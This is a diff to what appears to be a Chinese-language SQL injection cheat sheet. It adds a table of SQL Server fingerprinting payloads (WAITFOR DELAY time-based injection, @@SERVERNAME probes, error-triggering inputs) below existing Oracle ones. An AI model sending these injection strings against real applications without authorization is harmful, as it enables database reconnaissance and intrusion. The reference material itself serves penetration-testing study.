@@ -112,3 +112,13 @@ Oracle识别：
 |睡眠|dbms_pipe.receive_message(('a'),10)|
 |默认变量|SELECT banner FROM v$version<br>SELECT version FROM v$instance|
 |比较函数|ROWNUM=ROWNUM<br>RAWTOHEX('AB')=RAWTOHEX('AB')|
+
+SQL Server识别：
+|描述|查询语句|
+|----|----|
+|睡眠|id=';WAITFOR DELAY '00:00:10'; --|
+|字符串拼接|id='mssql'+'mssql' --|
+|函数|@@rowcount --<br>SQUARE(1) --<br>@@pack_received --|
+|默认变量|id=sql'; SELECT @@SERVERNAME --|
+|错误信息|id='<br>id=@@SERVERNAME<br>id=0/@@SERVERNAME|
+|比较函数|BINARY_CHECKSUM(123)=BINARY_CHECKSUM(123)<br>@@CONNECTIONS>0<br>@@CONNECTIONS=@@CONNECTIONS|
